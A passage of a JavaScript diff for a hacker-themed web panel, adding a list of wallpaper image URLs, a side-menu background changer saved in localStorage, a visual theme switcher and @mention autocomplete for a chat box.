+  "https://i.postimg.cc/y8TwV767/360-F-608789044-me2Pt-F6ogx-ZKxd-Vzr-Blmt2ZYq-Mo-Z5z0E.jpg",
+
+  "https://i.postimg.cc/wTg29L1x/36e29fb333167866e9f4961fd686cc6a.jpg",
+
+  "https://i.postimg.cc/7ZpTZrK5/46c72b16317fef529fa5595143f6e8bc.jpg",
+
+  "https://i.postimg.cc/90W9HPJK/4b77e726b288a4d816cb2e3c194b8954.jpg",
+
+  "https://i.postimg.cc/TwvmCvmP/54006b42e589a12e78abd06ac6550805.jpg",
+
+  "https://i.postimg.cc/YCSxW7fB/56eebd8d4ff4117b40cc8b38d6383378.jpg",
+
+  "https://i.postimg.cc/0yrpNfPg/596ab1abdadd14f5d4b159256b8dce41.jpg",
+
+  "https://i.postimg.cc/BQBhFNrX/5b3bfd4d477b5d3768c39bd7d721d16c.jpg",
+
+  "https://i.postimg.cc/bYTbHMvY/5de38645b8a8a7edbf104a4cf3b967be.jpg",
+
+  "https://i.postimg.cc/44M2Zmzs/79065a72faea7decf81ebd10de644c32.jpg",
+
+  "https://i.postimg.cc/HnByYJNb/7cca66e6bc4a1ba447e7819463202526.jpg",
+
+  "https://i.postimg.cc/5tTpJrzd/a0808bb2f535b0b544f7725ebc2cb13b.jpg",
+
+  "https://i.postimg.cc/PrSWhcGC/a5cc22c43642ee40a75665208c8d388d.jpg",
+
+  "https://i.postimg.cc/5Ng3yyzq/Anonymous-Earth-iPhone-Wallpaper-4K.jpg",
+
+  "https://i.postimg.cc/k4NSHYFN/c0de7e8eab6a3d39238d36732ada3ade.jpg",
+
+  "https://i.postimg.cc/FzgxjsnW/c6d8a194464d693fd533fd10500781e7.jpg",
+
+  "https://i.postimg.cc/DfdQp0xf/cfd6c4a02a9237921c1d1c414c831031.jpg",
+
+  "https://i.postimg.cc/FHGnMGGm/concepto-de-seguridad-hacker-sin-rostro-en-el-trabajo-con-la-inscripcion-pirateria-et.jpg",
+
+  "https://i.postimg.cc/ZnhcByjC/d69d3152570a367eecb6ca3b52cdf720.jpg",
+
+  "https://i.postimg.cc/G3sV4F3Q/depositphotos-710393540-stock-photo-faceless-hacker-hacking-inscription-binary.webp",
+
+  "https://i.postimg.cc/VvRjJZJ0/desktop-wallpaper-guy-fawkes-mask-anon-mask.jpg",
+
+  "https://i.postimg.cc/WpMSRXb8/desktop-wallpaper-iphone-for-iphone-8-iphone-8-plus-iphone-6s-iphone-6s-plus-iphone-x-and-ipod-touch.jpg",
+
+  "https://i.postimg.cc/d0yr2Vhf/e83ca84415892f958189823dbf647e34.jpg",
+
+  "https://i.postimg.cc/K8Vt3M8B/fbc0925ccbc21d2bfa35fe57d606a528.jpg",
+
+  "https://i.postimg.cc/tTJDGjVv/fondo-de-codigo-verde-pirateria-en-curso.jpg",
+
+  "https://i.postimg.cc/2SNHbMcH/G6ba-Fm.jpg",
+
+  "https://i.postimg.cc/Y9vVfg1X/hacker-g1e3a44200-1920-b6ba00f811758a41c98bff2db4b9e3e4-2000.jpg",
+
+  "https://i.postimg.cc/HxFNSxz5/hacker-group-names-are-now-absurdly-out-of-control-v0-e5o1bw2DPr666vpx8NI3CZm-BCo-ESLyjff-QOo-Kn-N-k.jpg",
+
+  "https://i.postimg.cc/FzcBw4CG/hacking-ciberseguridad.jpg",
+
+  "https://i.postimg.cc/4dpvgxZJ/HD-wallpaper-anonymous-hack.jpg",
+
+  "https://i.postimg.cc/6qwr5x5m/HD-wallpaper-anonymous-mask-smoke-iphone-iphone-iphone.jpg",
+
+  "https://i.postimg.cc/jqN3xRv8/HD-wallpaper-kali-linux-neon-kali-linux-neon-thumbnail.jpg",
+
+  "https://i.postimg.cc/GhC796Sf/images-r-bCqBCLR5XiHul6s3TDDxD71QMB273IbthMfxg75k8GkKqBTmzDOYA5YujiWfmd3yjPBGAyVPn6LJDQe.webp",
+
+  "https://i.postimg.cc/KYRQdbRr/kali-linux-neon-dragon-968bqdlzy2n7tfu3.webp",
+
+  "https://i.postimg.cc/90GLJBr3/kali-linux-silver-dragon-vj6bgoy7ysr3s6ag.jpg",
+
+  "https://i.postimg.cc/vHrKzGVy/pngtree-security-concept-lock-on-digital-screen-locks-hacker-protection-photo-picture-image-6526616.png",
+
+  "https://i.postimg.cc/jC0hfnXc/the-anonymus-guy-lb.jpg",
+
+  "https://i.postimg.cc/Y9Lnm774/wired-placeholder-dummy.jpg",
+
+  "https://i.postimg.cc/Jz7p5Z8x/wp13404605.jpg",
+
+  "https://i.postimg.cc/KY67wMXb/wp14671539.jpg",
+
+  "https://i.postimg.cc/6pVMdcFT/wp2697320.jpg"
+
+];
+
+window.cambiarFondoMenu = () => {
+
+  const cont = $id("imagenesFondoMenuLateral");
+
+  const lista = $id("imagenesMenuLateralLista");
+
+  
+
+  cont.style.display = cont.style.display === "block" ? "none" : "block";
+
+  
+
+  if (cont.style.display === "block" && lista.innerHTML === "") {
+
+    imagenesMenuLateral.forEach(img => {
+
+      const el = document.createElement("img");
+
+      el.src = img;
+
+      el.loading = "lazy";
+
+      el.style.cssText = "width:100%;height:auto;cursor:pointer;border:3px solid #0f0;border-radius:8px;margin:6px 0;box-shadow:0 0 15px #0f0;";
+
+      
+
+      el.onclick = () => {
+
+        const panel = $id("panel");
+
+        if (panel) {
+
+          // ← AQUÍ EL CAMBIO CLAVE: escapamos la URL
+
+          const urlEscapada = img.replace(/\(/g, '%28').replace(/\)/g, '%29');
+
+          panel.style.backgroundImage = `url(${urlEscapada})`;
+
+          panel.style.backgroundSize = "cover";
+
+          panel.style.backgroundPosition = "center";
+
+          panel.style.backgroundRepeat = "no-repeat";
+
+        }
+
+        localStorage.setItem("fondoMenuLateral", img); // guardamos la original (sin escapar)
+
+        cont.style.display = "none";
+
+        mostrarNotif("Fondo del menú lateral cambiado");
+
+      };
+
+      
+
+      lista.appendChild(el);
+
+    });
+
+  }
+
+};
+
+// Cargar fondo guardado al iniciar
+
+function cargarFondoMenuLateralGuardado() {
+
+  const fondoGuardado = localStorage.getItem("fondoMenuLateral");
+
+  if (fondoGuardado) {
+
+    const panel = $id("panel");
+
+    if (panel) {
+
+      panel.style.backgroundImage = `url(${fondoGuardado})`;
+
+      panel.style.backgroundSize = "cover";
+
+      panel.style.backgroundPosition = "center";
+
+      panel.style.backgroundRepeat = "no-repeat";
+
+    }
+
+  }
+
+}
+
+window.addEventListener("load", cargarFondoMenuLateralGuardado);
+
+// ================== TEMA 2 (EFECTOS) ==================
+
+// (Igual)
+
+document.getElementById("btnTema2").onclick = function(e) {
+
+  e.stopPropagation();
+
+  const lista = $id("listaTema2");
+
+  lista.style.display = lista.style.display === "block" ? "none" : "block";
+
+};
+
+document.querySelectorAll('.tema-opt').forEach(item => {
+
+  item.onclick = function() {
+
+    const efecto = this.dataset.t;
+
+    document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatMessages,#chatInput,#chatUsuario,#acortador,.btn-copiar,#panel,#submenu > div,#registros,#ventanaAcortador,#ventanaMisEnlaces,#modalContent,#usuariosOnlineBox div,#btnMostrarAcortador,#acortadorBtn,.btn[onclick="copiarLink()"]').forEach(el => {
+
+      el.classList.remove('tema-none','tema-matrix','tema-grid','tema-scan','tema-holo','tema-transparent','tema-neon','tema-circuit','tema-glitch2','tema-wave','tema-pulse','tema-hack','tema-darkspark','tema-neonglow','tema-darkgrid','tema-darkpulse','tema-cyberspark','tema-darkglitch','tema-darkwave','tema-darkscan','tema-darkholo','tema-darkcircuit');
+
+      el.classList.add('tema-' + efecto);
+
+    });
+
+    localStorage.setItem('tema2', efecto);
+
+    $id("listaTema2").style.display = "none";
+
+  };
+
+});
+
+const savedTema = localStorage.getItem('tema2') || 'none';
+
+document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatMessages,#chatInput,#chatUsuario,#acortador,.btn-copiar,#panel,#submenu > div,#registros,#ventanaAcortador,#ventanaMisEnlaces,#modalContent,#usuariosOnlineBox div,#btnMostrarAcortador,#acortadorBtn,.btn[onclick="copiarLink()"]').forEach(el => {
+
+  el.classList.add('tema-' + savedTema);
+
+});
+
+// ================== MENCIONES @ — 100% FUNCIONAL EN TU PANEL ==================
+
+// (Igual, el bloque completo)
+
+(function() {
+
+  setTimeout(() => {
+
+    const input = $id("chatInput");
+
+    const contenedor = document.querySelector(".chat-input-container");
+
+    if (!input || !contenedor) return;
+
+    contenedor.style.position = "relative";
+
+    const lista = document.createElement("div");
+
+    lista.style.cssText = "position:absolute;bottom:70px;left:10px;width:calc(100%-20px);background:#000;border:2px solid #0f0;padding:10px;border-radius:8px;max-height:180px;overflow:auto;display:none;z-index:99999;box-shadow:0 0 30px #0f0;color:#0f0;font-family:monospace;";
+
+    contenedor.appendChild(lista);
+
+    let usuarios = new Set();
+
+    function actualizarUsuarios() {
+
+      usuarios.clear();
+
+      document.querySelectorAll("#chatMessages div").forEach(d => {
+
+        const txt = d.textContent;
+
+        if (txt && txt.includes(":")) {
+
+          const nombre = txt.split(":")[0].trim();
+
+          if (nombre) usuarios.add(nombre);
+
+        }
+
+      });
+
+    }
+
+    input.addEventListener("input", () => {
+
+      const v = input.value;
+
+      const pos = input.selectionStart;
+
+      const arroba = v.lastIndexOf("@", pos-1);
+
+      if (arroba === -1) return lista.style.display = "none";
+
+      const buscar = v.slice(arroba+1, pos).toLowerCase();
+
+      const matches = [...usuarios].filter(u => u.toLowerCase().includes(buscar));
+
+      if (!matches.length) return lista.style.display = "none";
+
+      lista.innerHTML = "";
+
+      matches.forEach(u => {
+
+        const item = document.createElement("div");
+
+        item.textContent = u;
+
+        item.style.cssText = "padding:8px;cursor:pointer;border-bottom:1px solid #0f0;";
+
+        item.onmouseover = () => item.style.background = "#0f0", item.style.color = "#000";
+
+        item.onmouseout  = () => item.style.background = "", item.style.color = "#0f0";
+
+        item.onclick = () => {
+
+          input.value = v.slice(0,arroba) + "@" + u + " " + v.slice(pos);
+
+          lista.style.display = "none";
+
+          input.focus();
+
+        };
+
+        lista.appendChild(item);
+
+      });
+
+      lista.style.display = "block";
+
+    });
+
+    document.addEventListener("click", e => {
+
+      if (!input.contains(e.target) && !lista.contains(e.target)) {
+
+        lista.style.display = "none";
+
+      }
+
+    });
+
+    setInterval(actualizarUsuarios, 2000);
+
+    actualizarUsuarios();
+
+  }, 2000);
+
+})();
